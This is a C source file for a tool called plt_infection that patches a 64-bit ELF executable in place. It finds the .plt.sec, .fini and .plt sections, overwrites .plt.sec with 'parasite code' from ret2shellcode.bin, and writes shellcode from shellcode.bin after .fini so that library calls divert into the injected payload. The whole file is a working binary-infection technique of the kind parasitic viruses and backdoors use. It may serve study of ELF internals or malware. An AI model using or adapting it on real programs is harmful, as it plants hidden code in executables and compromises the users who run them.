//Usage:./plt_infection -f <filename> (need no pie)
//64bit
#include <stdio.h>
#include <elf.h> //for elf struct
#include <string.h>

#define FILE_BUF_MAX 0x100000

char file_buf[FILE_BUF_MAX];
char parasite_code[0x10];
char shellcode[0x1000];

void main(int argc ,char** argv)
{
    FILE* fp;
    
    //read file into mem    
    fp = fopen(argv[1],"r+");
    fread(file_buf,sizeof(char),sizeof(file_buf),fp);
    
    //find .plt
    Elf64_Ehdr* Elf64Header;
    Elf64_Shdr* Elf64SectionHeader;
    unsigned int Elf64SectionHeaderNameTableOffset;
    unsigned int PltFileAddr;
    unsigned int ShellcodeFileAddr;
    unsigned int Ret2shellcodeFileAddr;

    Elf64Header = (Elf64_Ehdr*)file_buf;
    unsigned int Elf64SectionHeaderNameIndex = Elf64Header->e_shstrndx;
    unsigned int shoff = Elf64Header->e_shoff;
    unsigned int shnum = Elf64Header->e_shnum;
    Elf64SectionHeader = (Elf64_Shdr*)(file_buf+shoff);
    Elf64SectionHeaderNameTableOffset = (Elf64SectionHeader + Elf64SectionHeaderNameIndex)->sh_offset;

    for(int i=0; i<shnum; i++)
    { 
        if(!strcmp(file_buf+Elf64SectionHeaderNameTableOffset+((Elf64SectionHeader+i)->sh_name) , ".plt.sec"))
        {
            Ret2shellcodeFileAddr = (Elf64SectionHeader+i)->sh_offset;
        }

        if(!strcmp(file_buf+Elf64SectionHeaderNameTableOffset+((Elf64SectionHeader+i)->sh_name) , ".fini"))
        {
            ShellcodeFileAddr = (Elf64SectionHeader+i)->sh_offset + (Elf64SectionHeader+i)->sh_size;
        }
        
        if(!strcmp(file_buf+Elf64SectionHeaderNameTableOffset+((Elf64SectionHeader+i)->sh_name) , ".plt"))
        {
            PltFileAddr = (Elf64SectionHeader+i)->sh_offset;
        }
    }

    printf("Parasite Code File Address:%x\n",Ret2shellcodeFileAddr);
    printf("PLT File Address:%x\n",PltFileAddr);
    printf("Shellcode File Address:%x\n",ShellcodeFileAddr);
    //put parasite code (pop+ret) into xxx@plt(.plt.sec) , ret to shellcode
    FILE* ret2shellcode_fp;
    ret2shellcode_fp = fopen("./ret2shellcode.bin","rb");
    fread(parasite_code,sizeof(char),sizeof(parasite_code),ret2shellcode_fp);
    fclose(ret2shellcode_fp);

    fseek(fp,Ret2shellcodeFileAddr,SEEK_SET);
    fwrite(parasite_code,sizeof(char),sizeof(parasite_code),fp);
    
    //write in shellcode , end of jmp to memaddr(.plt)+0x10
    FILE* shellcode_fp;
    shellcode_fp = fopen("./shellcode.bin","rb");
    fread(shellcode,sizeof(char),sizeof(shellcode),shellcode_fp);
    fclose(shellcode_fp);

    fseek(fp,ShellcodeFileAddr,SEEK_SET);
    fwrite(shellcode,sizeof(char),sizeof(shellcode),fp);

    //end
    fclose(fp);
}